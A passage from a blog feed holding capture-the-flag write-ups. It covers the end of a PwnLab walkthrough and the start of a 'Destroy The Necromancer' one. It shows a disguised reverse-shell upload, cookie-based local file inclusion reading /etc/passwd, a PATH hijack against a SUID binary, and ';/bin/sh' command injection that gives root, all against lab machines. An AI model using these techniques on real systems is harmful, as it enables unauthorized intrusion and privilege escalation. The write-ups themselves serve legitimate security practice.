</span><span class='line'><span class="x">        &amp;lt;input type=&#39;submit&#39; name=&#39;submit&#39; value=&#39;Upload&#39;/&amp;gt;</span>
</span><span class='line'><span class="x">    &amp;lt;/form&amp;gt;</span>
</span><span class='line'><span class="x">&amp;lt;/body&amp;gt;</span>
</span><span class='line'><span class="x">&lt;/code&gt;&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&lt;/html&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php</span>
</span><span class='line'><span class="x">if(isset($_POST[&amp;lsquo;submit&amp;rsquo;])) {&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;pre&gt;&lt;code&gt;if ($_FILES[&#39;file&#39;][&#39;error&#39;] &amp;lt;= 0) {</span>
</span><span class='line'><span class="x">    $filename  = $_FILES[&#39;file&#39;][&#39;name&#39;];</span>
</span><span class='line'><span class="x">    $filetype  = $_FILES[&#39;file&#39;][&#39;type&#39;];</span>
</span><span class='line'><span class="x">    $uploaddir = &#39;upload/&#39;;</span>
</span><span class='line'><span class="x">    $file_ext  = strrchr($filename, &#39;.&#39;);</span>
</span><span class='line'><span class="x">    $imageinfo = getimagesize($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);</span>
</span><span class='line'><span class="x">    $whitelist = array(&quot;.jpg&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.png&quot;); </span>
</span><span class='line'>
</span><span class='line'><span class="x">    if (!(in_array($file_ext, $whitelist))) {</span>
</span><span class='line'><span class="x">        die(&#39;Not allowed extension, please upload images only.&#39;);</span>
</span><span class='line'><span class="x">    }</span>
</span><span class='line'>
</span><span class='line'><span class="x">    if(strpos($filetype,&#39;image&#39;) === false) {</span>
</span><span class='line'><span class="x">        die(&#39;Error 001&#39;);</span>
</span><span class='line'><span class="x">    }</span>
</span><span class='line'>
</span><span class='line'><span class="x">    if($imageinfo[&#39;mime&#39;] != &#39;image/gif&#39; &amp;amp;&amp;amp; $imageinfo[&#39;mime&#39;] != &#39;image/jpeg&#39; &amp;amp;&amp;amp; $imageinfo[&#39;mime&#39;] != &#39;image/jpg&#39;&amp;amp;&amp;amp; $imageinfo[&#39;mime&#39;] != &#39;image/png&#39;) {</span>
</span><span class='line'><span class="x">        die(&#39;Error 002&#39;);</span>
</span><span class='line'><span class="x">    }</span>
</span><span class='line'>
</span><span class='line'><span class="x">    if(substr_count($filetype, &#39;/&#39;)&amp;gt;1){</span>
</span><span class='line'><span class="x">        die(&#39;Error 003&#39;);</span>
</span><span class='line'><span class="x">    }</span>
</span><span class='line'>
</span><span class='line'><span class="x">    $uploadfile = $uploaddir . md5(basename($_FILES[&#39;file&#39;][&#39;name&#39;])).$file_ext;</span>
</span><span class='line'>
</span><span class='line'><span class="x">    if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadfile)) {</span>
</span><span class='line'><span class="x">        echo &quot;&amp;lt;img src=\&quot;&quot;.$uploadfile.&quot;\&quot;&amp;gt;&amp;lt;br /&amp;gt;&quot;;</span>
</span><span class='line'><span class="x">    } else {</span>
</span><span class='line'><span class="x">        die(&#39;Error 4&#39;);</span>
</span><span class='line'><span class="x">    }</span>
</span><span class='line'><span class="x">}</span>
</span><span class='line'><span class="x">&lt;/code&gt;&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;}&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;?&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>We can see that the file will get uploaded to the /upload folder with an MD5 name and that it has to be an image file of the 4 allowed types, complete with a matching MIME type. To test it, I changed pentestmonkey&rsquo;s reverse shell extension to .gif and added the magic string at the beginning of the file (GIF98). Then I pushed the upload button and bingo! The shell has been successfully deployed at <code>upload/ff280c52a4fbcbea847ca4a2d69ce6c0.gif</code></p>

<p>My listener is prepared and all, but there is still the matter of how to execute the shell. For any possible hint, I&rsquo;ve looked t the source code of the index page:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'><span class="c1">//Multilingual. Not implemented yet.</span>
</span><span class='line'><span class="c1">//setcookie(&amp;ldquo;lang&amp;rdquo;,&amp;ldquo;en.lang.php&amp;rdquo;);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">lang</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span>
</span><span class='line'><span class="p">{</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="k">include</span><span class="p">(</span><span class="s2">&quot;lang/&quot;</span><span class="o">.</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="p">}</span>
</span><span class='line'><span class="c1">// Not implemented yet.</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;html&gt;</span>
</span><span class='line'><span class="x">&lt;head&gt;</span>
</span><span class='line'><span class="x">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span>
</span><span class='line'><span class="x">&lt;/head&gt;</span>
</span><span class='line'><span class="x">&lt;body&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;center&gt;</span>
</span><span class='line'><span class="x">&lt;img src=&quot;images/pwnlab.png&quot;&gt;&lt;br /&gt;</span>
</span><span class='line'><span class="x">[ &lt;a href=&quot;http://chousensha.github.io/&quot;&gt;Home&lt;/a&gt; ] [ &lt;a href=&quot;?page=login&quot;&gt;Login&lt;/a&gt; ] [ &lt;a href=&quot;?page=upload&quot;&gt;Upload&lt;/a&gt; ]</span>
</span><span class='line'><span class="x">&lt;hr/&gt;&lt;br/&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]))</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Use this server to upload and share image files inside the intranet&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;/center&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&lt;/body&gt;</span>
</span><span class='line'><span class="x">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>That cookie parameter looks vulnerable if we can include a file of our choosing. I tested it by replaying a request in Burp and using the following LFI for the cookie value:</p>

<p><code>
Cookie: lang=../../../../etc/passwd
</code></p>

<p>The response came back with the contents of the passwd file, so it worked! I did the same, this time setting the cookie to the path of the previously uploaded shell:</p>

<p><code>
Cookie: lang=../upload/ff280c52a4fbcbea847ca4a2d69ce6c0.gif
</code></p>

<p>And in our listener, we have a hit!</p>

<p><code>
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 36356
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
 11:08:31 up  2:34,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty;pty.spawn('/bin/sh');"
</code></p>

<p>I&rsquo;ve proceeded to switch through the 3 users for which I got the passwords earlier and see what can be done. Nothing interesting from kent, getting an authentication failure as mike, but in kane&rsquo;s home folder there&rsquo;s an interesting SUID binary called <em>msgmike</em></p>

<p><code>
-rwsr-sr-x 1 mike mike 5.1K Mar 17  2016 msgmike
</code></p>

<p>Trying to run it gives an error:</p>

<p><code>
kane@pwnlab:~$ ./msgmike
./msgmike
cat: /home/mike/msg.txt: No such file or directory
</code></p>

<p>Interesting, this calls cat, but not from an absolute path. So if we create a malicious binary called cat and add kane&rsquo;s home to the PATH variable, we should be able to run an arbitrary program with mike&rsquo;s privileges.</p>

<p><code>
kane@pwnlab:~$ echo "/bin/bash" &gt; cat
echo "/bin/bash" &gt; cat
kane@pwnlab:~$ chmod 777 cat
chmod 777 cat
</code></p>

<p>Here we want to run bash as mike. Let&rsquo;s see how the PATH looks:</p>

<p><code>
kane@pwnlab:~$ echo $PATH
echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</code></p>

<p>Now let&rsquo;s add the current location to the PATH:</p>

<p><code>
export PATH=.:$PATH
kane@pwnlab:~$ echo $PATH
echo $PATH
.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:
</code></p>

<p>Running the binary turns us into mike!</p>

<p><code>
kane@pwnlab:~$ ./msgmike
./msgmike
mike@pwnlab:~$
</code></p>

<p>In mike&rsquo;s home there is another SUID binary, this time owned by root. We can see where this is going..</p>

<p><code>
-rwsr-sr-x 1 root root 5.3K Mar 17  2016 msg2root
mike@pwnlab:/home/mike$ ./msg2root
./msg2root
Message for root: pwn incoming
pwn incoming
pwn incoming
</code></p>

<p>This binary takes an input and outputs it to the screen, while also appending it to a file in root&rsquo;s home (below line is taken from strings output)</p>

<p><code>
/bin/echo %s &gt;&gt; /root/messages.txt
</code></p>

<p>We can chain commands by passing a string for the echo function and then adding a second command with <code>;</code>:</p>

<p>```
./msg2root
./msg2root
Message for root: hey;/bin/sh
hey;/bin/sh
hey</p>

<h1></h1>

<p>```</p>

<p>We&rsquo;re root now! Read the flag and game over:</p>

<p>```</p>

<h1>cat flag.txt</h1>

<p>cat flag.txt
.&ndash;=~=&ndash;.                                                                 .&ndash;=~=&ndash;.
(<strong>  <em>)&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;(</strong>  <em>)
(</em> <strong><em>)  </em></strong><strong>                             _                            (<em> </em></strong>)
(<strong>  _) /  </strong> \                           | |                           (<strong>  _)
( _ </strong>) | /  \/ <em><strong>  _ </strong>   <strong> _ _ </strong> __ </em>| |<em> </em><strong>                      ( _ </strong>)
(<strong>  <em>) | |    / _ \| &lsquo;</em> \ / _<code>| '__/ _</code> | </strong>/ <strong>|                     (</strong>  <em>)
(</em> <strong><em>) | _</em>/\ (<em>) | | | | (</em>| | | | (<em>| | |</em>_<em> \                     (</em> </strong><em>)
(__  </em>)  _<em><strong>/_</strong>/|</em>| |<em>|_</em>, |<em>|  _</em>,<em>|_</em>|<em><strong>/                     (</strong>  </em>)
( _ <strong>)                     </strong>/ |                                       ( _ <strong>)
(</strong>  <em>)                    |</em><strong>/                                        (</strong>  <em>)
(__  </em>)                                                                 (<strong>  <em>)
(</em> </strong><em>) If  you are  reading this,  means  that you have  break 'init&rsquo;  (</em> <em><strong>)
( _ </strong>) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ <strong>)
(</strong>  </em>) this challenge.                                                 (<strong>  <em>)
(</em> </strong><em>)                                                                 (</em> <em><strong>)
( _ </strong>) Please send me  your  feedback or your  writeup,  I will  love  ( _ <strong>)
(</strong>  </em>) reading it                                                      (<strong>  _)
(</strong>  <em>)                                                                 (__  </em>)
(<strong>  _)                                             For sniferl4bs.com  (</strong>  <em>)
( _ <strong>)                                <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#x63;&#x6c;&#97;&#x6f;&#x72;&#x40;&#80;&#119;&#110;&#76;&#97;&#x62;&#46;&#x6e;&#x65;&#116;">&#x63;&#108;&#97;&#x6f;&#x72;&#64;&#80;&#119;&#x6e;&#x4c;&#x61;&#98;&#x2e;&#110;&#x65;&#116;</a> &ndash; @Chronicoder  ( _ </strong>)
(__  </em>)                                                                 (<strong>  <em>)
(</em> </strong><em>)&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;(<em> </em><em>_)
`&ndash;.</em>.&ndash;&lsquo;             <br/>
```</p>

<p>This was a nice challenge with the LFI twist! A new technique added to our repertoire, and another boot2root completed!</p>

<p>```</p>

<hr />

<p>/ You&rsquo;re currently going through a   \
| difficult transition period called |
\ &ldquo;Life.&rdquo;                            /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Destroy The Necromancer]]></title>
    <link href="http://chousensha.github.io/blog/2018/06/09/destroy-the-necromancer/"/>
    <updated>2018-06-09T06:02:55-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/06/09/destroy-the-necromancer</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s challenge is a boot2root with 11 flags to collect.</p>

<!-- more -->


<p>The Nmap scan took really long and found nothing:</p>

<p>```
Nmap scan report for 192.168.217.142
Host is up (0.00023s latency).
All 65535 scanned ports on 192.168.217.142 are filtered
MAC Address: 00:0C:29:3B:03:B5 (VMware)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop</p>

<p>TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 192.168.217.142</p>

<p>OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 1336.70 seconds
```</p>

<p>Then I tried an UDP scan, but only got 1 hit:</p>

<p><code>
PORT    STATE SERVICE
666/udp open  doom
</code></p>

<p>I tried connecting to it with netcat, but other than a message, I didn&rsquo;t find anything:</p>

<p>```
nc -vnu 192.168.217.142 666
(UNKNOWN) [192.168.217.142] 666 (?) open</p>

<p>You gasp for air! Time is running out!</p>

<p>You gasp for air! Time is running out!
```</p>

<h1>Flag #1 &ndash; Sniffing network traffic</h1>

<p>With nothing else to go with, I started sniffing the local traffic and looked if the Necromancer is sending anything across the network:</p>

<p><img class="center" src="/images/pentest/necromancer/capture.PNG" title="&lsquo;capture&rsquo; &lsquo;Wireshark capture&rsquo;" ></p>

<p>The machine is trying to establish TCP connections (SYN flag) to different IPs, on port 4444. So what happens if we listen on that port on our attacker machine?</p>

<p><code>
root@kali:~# nc -vnlp 4444
listening on [any] 4444 ...
connect to [192.168.223.129] from (UNKNOWN) [192.168.223.128] 25759
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...
</code></p>

<p>We received a string! I used an online Base64 decoder to decipher this:</p>

<p>```
Welcome!</p>

<p>You find yourself staring towards the horizon, with nothing but silence surrounding you.
You look east, then south, then west, all you can see is a great wasteland of nothingness.</p>

<p>Turning to your north you notice a small flicker of light in the distance.
You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.</p>

<p>The air around you begins to get thicker, and your heart begins to beat against your chest.
You turn to your left.. then to your right!  You are trapped!</p>

<p>You fumble through your pockets.. nothing!<br/>
You look down and see you are standing in sand.<br/>
Dropping to your knees you begin to dig frantically.</p>

<p>As you dig you notice the barrier extends underground!<br/>
Frantically you keep digging and digging until your nails suddenly catch on an object.</p>

<p>You dig further and discover a small wooden box.<br/>
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.</p>

<p>You open the box, and find a parchment with the following written on it. &ldquo;Chant the string of flag1 &ndash; u666&rdquo;
```</p>

<p>An MD5 hash..I decoded it and moved on.</p>

<p>Flag #1: <strong>opensesame</strong></p>

<h1>Flag #2 &ndash; Chanting the string</h1>

<p>In the previous message, we have a hint for the 2nd flag. Now we&rsquo;ve decoded the 1st flag, so we need to send it..where? To its doom! Remember the UDP port 666 we discovered earlier:</p>

<p>```
root@kali:~# nc -vnu 192.168.223.128 666
(UNKNOWN) [192.168.223.128] 666 (?) open
opensesame</p>

<p>A loud crack of thunder sounds as you are knocked to your feet!</p>

<p>Dazed, you start to feel fresh air entering your lungs.</p>

<p>You are free!</p>

<p>In front of you written in the sand are the words:</p>

<p>flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}</p>

<p>As you stand to your feet you notice that you can no longer see the flicker of light in the distance.</p>

<p>You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.</p>

<p>As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.</p>

<p>The birds get closer, and closer, and closer.</p>

<p>Staring up at the crows you can see they are in a formation.</p>

<p>Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.</p>

<p>As quickly as the birds appeared, they have left you once again&hellip;. alone&hellip; tortured by the deafening sound of silence.</p>

<p>666 is closed.
```</p>

<p>Another flag, another hash. Flag #2: <strong>1033750779</strong></p>

<h1>Flag #3 &ndash; A pile of feathers</h1>

<p>The hint mentioned the number 80, so I used my browser to navigate to it and ended up in The Chasm.</p>

<p><img class="center" src="/images/pentest/necromancer/chasm.png" title="&lsquo;the chasm&rsquo; &lsquo;The Chasm&rsquo;" ></p>

<p>I&rsquo;ve downloaded the image, pileoffeathers.jpg, and ran it through exiftool, with no discoveries. Then I ran strings on it and saw a couple of mentions about a file called <em>feathers.txt</em>. I thought that a text file must be hidden in the image. so I looked for ways to extract it. Kali comes pre-equipped with just the right tool:</p>

<blockquote><p>binwalk  &ndash; tool for searching binary images for embedded files and executable code</p></blockquote>

<p>```
binwalk -e pileoffeathers.jpg</p>

<h2>DECIMAL       HEXADECIMAL     DESCRIPTION</h2>

<p>0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, little-endian offset of first image directory: 8
270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#&ldquo;> &lt;rdf:Description rdf:about=&rdquo;&ldquo; xmlns:xmp="<a href="http://ns.adobe.com/xap/1.0/">http://ns.adobe.com/xap/1.0/</a>&rdquo; xmlns:xmpMM=&ldquo;http
36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
37267         0x9193          End of Zip archive
```</p>

<p>The files were extracted in a directory called _pileoffeathers.jpg.extracted. Inside I found the feathers.txt file in a ZIP archive called 9082.zip.</p>

<p><code>
cat feathers.txt
ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==
</code></p>

<p>Another Base64 string. Decoded it to find the flag and the hint:</p>

<p><code>
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at
/amagicbridgeappearsatthechasm
</code></p>

<p>Flag #3: <strong>345465869</strong></p>

<h1>Flag #4 &ndash; Talisman</h1>

<p>On the web server, I went to the path of the above magic bridge, that leads to the cave:</p>

<p><img class="center" src="/images/pentest/necromancer/cave.png" title="&lsquo;cave&rsquo; &lsquo;cave entrance&rsquo;" ></p>

<p>Another image, this time it&rsquo;s a magicbook.jpg. But with all the usual tools I&rsquo;ve tried, I couldn&rsquo;t find any hidden information. I went back to the webpage and started bruteforcing for files and directories with different wordlists, and found nothing. Back to the drawing board..the hint is <em>There must be a magical item that could protect you from the necromancer&rsquo;s spell.</em>. After looking on the interwebz for a bit, I went the route of building a custom dictionary of magical items to use with dirb. I used cewl to build a list from the words on <a href="https://dnd5e.info/magic-items/alphabetical-magic-item-list">https://dnd5e.info/magic-items/alphabetical-magic-item-list</a></p>

<p><code>
cewl https://dnd5e.info/magic-items/alphabetical-magic-item-list -w magicitems.txt
CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
/usr/lib/ruby/vendor_ruby/spider/spider_instance.rb:125: warning: constant ::Fixnum is deprecated
</code></p>

<p>The wordlist has over 9k entries:</p>

<p><code>
wc -l magicitems.txt
9315 magicitems.txt
</code></p>

<p>Back to dirb, and this time it found something!</p>

<p>```
dirb <a href="http://192.168.223.128/amagicbridgeappearsatthechasm/">http://192.168.223.128/amagicbridgeappearsatthechasm/</a> /root/Downloads/magicitems.txt</p>

<hr />

<p>DIRB v2.22</p>

<h2>By The Dark Raver</h2>

<p>START_TIME: Sat Jun  9 09:08:18 2018
URL_BASE: <a href="http://192.168.223.128/amagicbridgeappearsatthechasm/">http://192.168.223.128/amagicbridgeappearsatthechasm/</a>
WORDLIST_FILES: /root/Downloads/magicitems.txt</p>

<hr />

<p>GENERATED WORDS: 9315</p>

<p>&mdash;&mdash; Scanning URL: <a href="http://192.168.223.128/amagicbridgeappearsatthechasm/">http://192.168.223.128/amagicbridgeappearsatthechasm/</a> &mdash;&mdash;
+ <a href="http://192.168.223.128/amagicbridgeappearsatthechasm/talisman">http://192.168.223.128/amagicbridgeappearsatthechasm/talisman</a> (CODE:200|SIZE:9676)</p>

<hr />

<p>END_TIME: Sat Jun  9 09:08:37 2018
DOWNLOADED: 9315 &ndash; FOUND: 1
```</p>

<p>A talisman! Going to the path leads to a binary called talisman. But running it doesn&rsquo;t produce the effect I&rsquo;d hoped:</p>

<p>```
./talisman
You have found a talisman.</p>

<p>The talisman is cold to the touch, and has no words or symbols on it&rsquo;s surface.</p>

<p>Do you want to wear the talisman?  y</p>

<p>Nothing happens.
```</p>

<p>I fired up GDB, set a breakpoint on main and ran the executable again.</p>

<p><code>
Breakpoint 1, 0x08048a21 in main ()
(gdb) disassemble
Dump of assembler code for function main:
   0x08048a13 &lt;+0&gt;: lea    0x4(%esp),%ecx
   0x08048a17 &lt;+4&gt;: and    $0xfffffff0,%esp
   0x08048a1a &lt;+7&gt;: pushl  -0x4(%ecx)
   0x08048a1d &lt;+10&gt;:    push   %ebp
   0x08048a1e &lt;+11&gt;:    mov    %esp,%ebp
   0x08048a20 &lt;+13&gt;:    push   %ecx
=&gt; 0x08048a21 &lt;+14&gt;:    sub    $0x4,%esp
   0x08048a24 &lt;+17&gt;:    call   0x8048529 &lt;wearTalisman&gt;
   0x08048a29 &lt;+22&gt;:    mov    $0x0,%eax
   0x08048a2e &lt;+27&gt;:    add    $0x4,%esp
   0x08048a31 &lt;+30&gt;:    pop    %ecx
   0x08048a32 &lt;+31&gt;:    pop    %ebp
   0x08048a33 &lt;+32&gt;:    lea    -0x4(%ecx),%esp
   0x08048a36 &lt;+35&gt;:    ret    
</code></p>

<p>There is a wearTalisman function that is about to be called. Must be what we&rsquo;ve seen when running the binary. I set up another breakpoint on this function and disassembled it, but I could see nothing interesting. Then I looked what other functions there might be in the binary:</p>

<p>```
(gdb) info functions
All defined functions:</p>

<p>Non-debugging symbols:
0x080482d0  <em>init
0x08048310  printf@plt
0x08048320  <strong>libc_start_main@plt
0x08048330  </strong>isoc99_scanf@plt
0x08048350  </em>start
0x08048380  <strong>x86.get_pc_thunk.bx
0x08048390  deregister_tm_clones
0x080483c0  register_tm_clones
0x08048400  </strong>do_global_dtors_aux
0x08048420  frame_dummy
0x0804844b  unhide
0x0804849d  hide
0x080484f4  myPrintf
0x08048529  wearTalisman
0x08048a13  main
0x08048a37  chantToBreakSpell
0x08049530  <strong>libc_csu_init
0x08049590  </strong>libc_csu_fini
0x08049594  <em>fini
0xf7fd6a30  </em>dl_catch_exception@plt
```</p>

<p>A function named chantToBreakSpell sounds exactly like what we need! And it wasn&rsquo;t called from main or wearTalisman. So I jumped directly to it:</p>

<p><code>
(gdb) jump chantToBreakSpell
Continuing at 0x8048a3b.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[Inferior 1 (process 3652) exited with code 0102]
</code></p>

<p>The talisman worked! Flag #4: <strong>blackmagic</strong></p>

<h1>Flag #5 &ndash; Black magic</h1>

<p>Like before, I&rsquo;ve tried sending the string, this time to UDP 31337, but:</p>

<p><code>
nc -vnu 192.168.223.128 31337
(UNKNOWN) [192.168.223.128] 31337 (?) open
bNothing happens.
lNothing happens.
aNothing happens.
cNothing happens.
kNothing happens.
mNothing happens.
aNothing happens.
gNothing happens.
iNothing happens.
cNothing happens.
